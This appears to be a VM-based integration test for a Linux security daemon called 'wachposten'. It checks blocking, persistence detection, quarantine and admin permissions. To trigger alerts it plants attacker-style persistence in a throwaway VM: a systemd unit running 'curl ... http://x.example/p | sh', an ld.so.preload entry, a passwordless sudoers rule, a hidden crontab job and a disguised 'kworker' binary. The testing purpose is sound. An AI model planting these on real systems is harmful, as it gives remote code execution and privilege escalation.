#!/usr/bin/env python3
"""Tests the root daemon in a real Fedora VM: fanotify, blocking, system persistence, rpm checks
and permissions. Needs no root on the host: QEMU with user networking, KVM and a cache folder.

Usage: test/vm.py [--keep]
The Fedora Cloud image is downloaded once to ~/.cache/wachposten-vm (or $VM_CACHE).
"""
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CACHE = os.environ.get("VM_CACHE", os.path.expanduser("~/.cache/wachposten-vm"))
CLOUD_DIR = "https://download.fedoraproject.org/pub/fedora/linux/releases/44/Cloud/x86_64/images/"
CLOUD_IMAGE = "Fedora-Cloud-Base-Generic-44-1.7.x86_64.qcow2"
SSH_PORT = int(os.environ.get("VM_SSH_PORT", "2347"))
TEST_SIGNATURE = "WACHPOSTEN-TEST-SIGNATURE-7f3a9c2e-NOT-MALWARE"

results = []


def check(name, ok, detail=""):
    results.append((name, bool(ok)))
    mark = "ok  " if ok else "FAIL"
    print(f"  [{mark}] {name}" + (f"  -- {str(detail)[-800:]}" if detail and not ok else ""), flush=True)


def cloud_image():
    os.makedirs(CACHE, exist_ok=True)
    path = f"{CACHE}/{CLOUD_IMAGE}"
    if not os.path.exists(path):
        print(f"downloading {CLOUD_IMAGE}", flush=True)
        part = f"{path}.part"
        with urllib.request.urlopen(CLOUD_DIR + CLOUD_IMAGE) as resp, open(part, "wb") as out:
            shutil.copyfileobj(resp, out)
        listing = urllib.request.urlopen(CLOUD_DIR).read().decode()
        name = re.search(r'Fedora-Cloud-44-[^"<>]*CHECKSUM', listing).group(0)
        sums = urllib.request.urlopen(CLOUD_DIR + name).read().decode()
        want = re.search(rf"SHA256 \({re.escape(CLOUD_IMAGE)}\) = (\w+)", sums).group(1)
        digest = hashlib.sha256()
        with open(part, "rb") as f:
            for chunk in iter(lambda: f.read(1 << 20), b""):
                digest.update(chunk)
        if digest.hexdigest() != want:
            os.remove(part)
            sys.exit("checksum mismatch")
        os.rename(part, path)
    return path


class VM:
    def __init__(self, work, image):
        self.work = work
        self.key = f"{work}/id"
        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", self.key], check=True)
        pub = open(f"{self.key}.pub").read().strip()
        seed = f"{work}/seed"
        os.makedirs(seed)
        with open(f"{seed}/user-data", "w") as f:
            f.write("#cloud-config\n" + json.dumps({
                "users": [
                    {"name": "fedora", "groups": ["wheel"], "sudo": "ALL=(ALL) NOPASSWD:ALL",
                     "ssh_authorized_keys": [pub]},
                    {"name": "gast"},
                ],
            }))
        with open(f"{seed}/meta-data", "w") as f:
            f.write("instance-id: wachposten-test\nlocal-hostname: wachposten-test\n")
        subprocess.run(["xorrisofs", "-quiet", "-output", f"{work}/seed.iso", "-volid", "cidata",
                        "-joliet", "-rock", seed], check=True)
        disk = f"{work}/disk.qcow2"
        subprocess.run(["qemu-img", "create", "-q", "-f", "qcow2", "-F", "qcow2", "-b", image, disk, "20G"],
                       check=True)
        self.process = subprocess.Popen(
            ["qemu-system-x86_64", "-enable-kvm", "-cpu", "host", "-m", "3072", "-smp", "2",
             "-display", "none", "-serial", f"file:{work}/serial.log",
             "-drive", f"file={disk},if=virtio",
             "-drive", f"file={work}/seed.iso,media=cdrom,readonly=on",
             "-nic", f"user,model=virtio,hostfwd=tcp:127.0.0.1:{SSH_PORT}-:22"])

    def sh(self, cmd, timeout=600):
        """Run a shell script as root."""
        argv = ["ssh", "-i", self.key, "-p", str(SSH_PORT), "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR", "-o", "ConnectTimeout=5",
                "fedora@127.0.0.1", "sudo sh -s"]
        return subprocess.run(argv, input=cmd, capture_output=True, text=True, timeout=timeout)

    def as_user(self, user, cmd, timeout=120):
        quoted = cmd.replace("'", "'\\''")
        return self.sh(f"runuser -u {user} -- sh -c '{quoted}'", timeout)

    def wait(self):
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                if self.sh("true", timeout=15).returncode == 0:
                    return True
            except subprocess.TimeoutExpired:
                pass
            time.sleep(3)
        return False

    def copy(self, src, dst):
        subprocess.run(["scp", "-q", "-i", self.key, "-P", str(SSH_PORT), "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
                        src, f"fedora@127.0.0.1:{dst}"], check=True)

    def stop(self):
        self.process.terminate()
        self.process.wait()


def events(vm, user, all_=False):
    out = vm.as_user(user, "wachposten --system events" + (" --all --limit 200" if all_ else "")).stdout
    rows = []
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 7 and parts[0].isdigit():
            rows.append({"id": int(parts[0]), "severity": parts[3], "change": parts[4],
                         "status": parts[5], "path": parts[6]})
    return rows


def find(rows, path, status=None):
    for r in rows:
        if r["path"] == path and (status is None or r["status"] == status):
            return r
    return None


def wait_for(fn, timeout=20):
    deadline = time.time() + timeout
    while time.time() < deadline:
        value = fn()
        if value:
            return value
        time.sleep(1)
    return fn()


def main():
    keep = "--keep" in sys.argv
    print("building release binaries", flush=True)
    subprocess.run(["cargo", "build", "--release", "-q", "-p", "wachposten-daemon", "-p", "wachposten"],
                   cwd=ROOT, check=True)
    work = tempfile.mkdtemp(prefix="wachposten-vm-", dir=os.path.expanduser("~/.cache"))
    vm = VM(work, cloud_image())
    try:
        print("booting", flush=True)
        if not vm.wait():
            print(open(f"{work}/serial.log", errors="replace").read()[-3000:])
            sys.exit("VM did not come up")
        for name in ["wachposten-daemon", "wachposten"]:
            vm.copy(f"{ROOT}/target/release/{name}", f"/tmp/{name}")
        vm.copy(f"{ROOT}/packaging/systemd/wachposten-daemon.service", "/tmp/wachposten-daemon.service")
        r = vm.sh("""set -e
install -m755 /tmp/wachposten-daemon /tmp/wachposten /usr/local/bin/
install -m644 /tmp/wachposten-daemon.service /etc/systemd/system/
rm -f /tmp/wachposten-daemon /tmp/wachposten /tmp/wachposten-daemon.service
restorecon -R /usr/local/bin /etc/systemd/system 2>/dev/null || true
systemctl daemon-reload
systemctl enable --now wachposten-daemon
sleep 4
findmnt -no FSTYPE /tmp; findmnt -no FSTYPE /dev/shm
""")
        check("daemon installed and started", r.returncode == 0, r.stderr)
        print("   /tmp and /dev/shm:", " ".join(r.stdout.split()), flush=True)

        print("status", flush=True)
        r = vm.as_user("fedora", "wachposten --system status")
        check("status: program starts watched", "program starts: watched" in r.stdout, r.stdout + r.stderr)
        check("status: blocking on", "known malware is blocked" in r.stdout, r.stdout)
        check("unit runs hardened", "NoNewPrivileges=yes" in vm.sh("systemctl show wachposten-daemon -p NoNewPrivileges").stdout)

        # A subscriber as the non-admin user, to see pushed events.
        vm.copy(os.path.join(ROOT, "test", "subscribe.py"), "/tmp/subscribe.py")
        vm.sh("chmod 644 /tmp/subscribe.py; cp /tmp/subscribe.py /usr/local/bin/wp-subscribe.py")
        vm.sh("runuser -u gast -- sh -c 'nohup python3 /usr/local/bin/wp-subscribe.py > /var/tmp/gast-push.log 2>&1 &'")

        print("blocking known malware in /tmp", flush=True)
        r = vm.as_user("gast", f"""printf '#!/bin/sh\\necho {TEST_SIGNATURE}\\n' > /tmp/evil.sh
chmod +x /tmp/evil.sh
/tmp/evil.sh; echo "rc=$?"
""")
        check("start of known malware refused", "rc=126" in r.stdout and "rc=0" not in r.stdout,
              r.stdout + r.stderr)
        ev = wait_for(lambda: find(events(vm, "gast"), "/tmp/evil.sh", "open"))
        check("blocked start becomes an open event for its owner", ev and ev["severity"] == "malicious", ev)

        print("harmless programs", flush=True)
        r = vm.as_user("gast", """printf '#!/bin/sh\\necho hello\\n' > /tmp/hello.sh
chmod +x /tmp/hello.sh
start=$(date +%s%N); for i in $(seq 200); do /tmp/hello.sh >/dev/null; done; end=$(date +%s%N)
echo ms=$(( (end-start)/1000000 ))
/tmp/hello.sh""")
        check("harmless start runs", "hello" in r.stdout, r.stdout + r.stderr)
        ms = int(re.search(r"ms=(\d+)", r.stdout).group(1)) if "ms=" in r.stdout else -1
        print(f"   200 starts from /tmp took {ms} ms", flush=True)
        check("held-up starts stay fast (200 starts < 4 s)", 0 <= ms < 4000, ms)
        hist = wait_for(lambda: find(events(vm, "gast", all_=True), "/tmp/hello.sh"))
        check("harmless start only recorded, no question", hist and hist["status"] == "accepted", hist)

        print("suspicious program from a hidden folder", flush=True)
        vm.as_user("gast", "mkdir -p /tmp/.x && cp /usr/bin/sleep /tmp/.x/kworker && (nohup /tmp/.x/kworker 300 >/dev/null 2>&1 &)")
        ev = wait_for(lambda: find(events(vm, "gast"), "/tmp/.x/kworker", "open"))
        check("hidden kworker raises a question", ev and ev["severity"] == "suspicious", ev)
        if ev:
            r = vm.as_user("gast", f"wachposten --system remove {ev['id']}")
            check("owner may remove it", r.returncode == 0, r.stdout + r.stderr)
            r = vm.sh("pgrep -f /tmp/.x/kworker; ls /tmp/.x/kworker 2>&1")
            check("process ended and file gone", "No such file" in r.stdout and not re.search(r"^\d+$", r.stdout, re.M),
                  r.stdout)

        print("/var/tmp (watched after the fact)", flush=True)
        vm.as_user("gast", f"printf '#!/bin/sh\\n# {TEST_SIGNATURE}\\nexit 0\\n' > /var/tmp/late.sh; chmod +x /var/tmp/late.sh; /var/tmp/late.sh")
        ev = wait_for(lambda: find(events(vm, "gast"), "/var/tmp/late.sh", "open"))
        check("malware started from /var/tmp is reported", ev and ev["severity"] == "malicious", ev)

        print("system-wide persistence", flush=True)
        vm.sh("""cat > /etc/systemd/system/evil.service <<'EOF'
[Service]
ExecStart=/bin/sh -c 'curl -s http://x.example/p | sh'
[Install]
WantedBy=multi-user.target
EOF
systemctl enable evil.service""")
        unit = wait_for(lambda: find(events(vm, "fedora"), "/etc/systemd/system/evil.service", "open"))
        link = wait_for(lambda: find(events(vm, "fedora"),
                                     "/etc/systemd/system/multi-user.target.wants/evil.service", "open"))
        check("new system service raises a question", unit and unit["severity"] == "suspicious", unit)
        check("enablement link raises a question", link is not None, link)
        seen = find(events(vm, "gast"), "/etc/systemd/system/evil.service", "open")
        check("non-admin sees system events", seen is not None)
        if unit:
            r = vm.as_user("gast", f"wachposten --system remove {unit['id']}")
            check("non-admin may not decide", r.returncode != 0 and "only admins" in r.stderr, r.stdout + r.stderr)
            for e in [unit, link]:
                if e:
                    r = vm.as_user("fedora", f"wachposten --system remove {e['id']}")
                    check(f"admin removes {os.path.basename(os.path.dirname(e['path']))}/{os.path.basename(e['path'])}",
                          r.returncode == 0, r.stdout + r.stderr)
            r = vm.sh("ls /etc/systemd/system/evil.service /etc/systemd/system/multi-user.target.wants/evil.service 2>&1; systemctl is-enabled evil.service 2>&1")
            check("service files gone", r.stdout.count("No such file") == 2, r.stdout)
            r = vm.as_user("fedora", "wachposten --system quarantine")
            check("removed files are in the system quarantine", "evil.service" in r.stdout, r.stdout + r.stderr)

        vm.sh("echo /tmp/libx.so > /etc/ld.so.preload")
        ev = wait_for(lambda: find(events(vm, "fedora"), "/etc/ld.so.preload", "open"))
        check("ld.so.preload raises a suspicious question", ev and ev["severity"] == "suspicious", ev)
        if ev:
            vm.as_user("fedora", f"wachposten --system remove {ev['id']}")
            check("ld.so.preload removed", "No such file" in vm.sh("ls /etc/ld.so.preload 2>&1").stdout)

        vm.sh("printf 'gast ALL=(ALL) NOPASSWD: ALL\\n' > /etc/sudoers.d/90-gast; chmod 440 /etc/sudoers.d/90-gast")
        ev = wait_for(lambda: find(events(vm, "fedora"), "/etc/sudoers.d/90-gast", "open"))
        check("new sudoers rule raises a question", ev is not None, ev)
        if ev:
            r = vm.as_user("fedora", f"wachposten --system allow {ev['id']}")
            check("admin allows it", r.returncode == 0, r.stdout + r.stderr)

        print("user crontab in the spool (owner kept on restore)", flush=True)
        r = vm.sh("rpm -q cronie >/dev/null || dnf -y -q install cronie", timeout=900)
        print("   cronie:", "installed" if r.returncode == 0 else r.stdout[-200:] + r.stderr[-200:], flush=True)
        r = vm.as_user("gast", "echo '* * * * * /dev/shm/.k' | crontab -")
        check("crontab written as gast", r.returncode == 0, r.stdout + r.stderr)
        ev = wait_for(lambda: find(events(vm, "fedora"), "/var/spool/cron/gast", "open"))
        check("crontab of another user is seen", ev and ev["severity"] == "suspicious", ev)
        if ev:
            vm.as_user("fedora", f"wachposten --system remove {ev['id']}")
            q = vm.as_user("fedora", "wachposten --system quarantine").stdout
            qid = next((l.split()[0] for l in q.splitlines() if "/var/spool/cron/gast" in l), None)
            if qid:
                r = vm.as_user("fedora", f"wachposten --system restore {qid}")
                st = vm.sh("stat -c '%U %a' /var/spool/cron/gast").stdout.strip()
                check("restored crontab keeps its owner", r.returncode == 0 and st == "gast 600", f"{st} {r.stderr}")

        print("package changes are not questioned", flush=True)
        r = vm.sh("dnf -y -q install --allowerasing vim-default-editor 2>&1 | tail -3; ls /etc/profile.d/ | grep -i editor",
                  timeout=900)
        if "vim-default-editor" in r.stdout:
            time.sleep(15)
            rows = events(vm, "fedora", all_=True)
            ev = find(rows, "/etc/profile.d/vim-default-editor.sh")
            check("file installed by dnf is accepted without a question",
                  ev and ev["status"] == "accepted", ev)
            check("no open questions after the install",
                  not [e for e in events(vm, "fedora") if e["path"].startswith("/etc/profile.d/")])
        else:
            print("   (skipped: dnf install failed)", r.stdout[-300:], flush=True)

        log = vm.sh("cat /var/tmp/gast-push.log").stdout
        check("subscribed non-admin agent got pushes", "evil.sh" in log and "evil.service" in log, log[-500:])
        check("non-admin push for system events has no decision right",
              '"can_decide": false' in log or '"can_decide":false' in log, log[-500:])

        r = vm.sh("systemctl is-active wachposten-daemon; journalctl -u wachposten-daemon --no-pager | grep -ciE 'panic|error' || true")
        check("daemon still running, no errors in its log", r.stdout.split()[0] == "active" and r.stdout.split()[-1] == "0",
              vm.sh("journalctl -u wachposten-daemon --no-pager | grep -iE 'panic|error' | tail -5").stdout)
    finally:
        if keep:
            print(f"VM kept running; ssh -i {work}/id -p {SSH_PORT} fedora@127.0.0.1", flush=True)
        else:
            vm.stop()
            shutil.rmtree(work, ignore_errors=True)

    failed = [n for n, ok in results if not ok]
    print(f"\n{len(results) - len(failed)}/{len(results)} checks passed")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
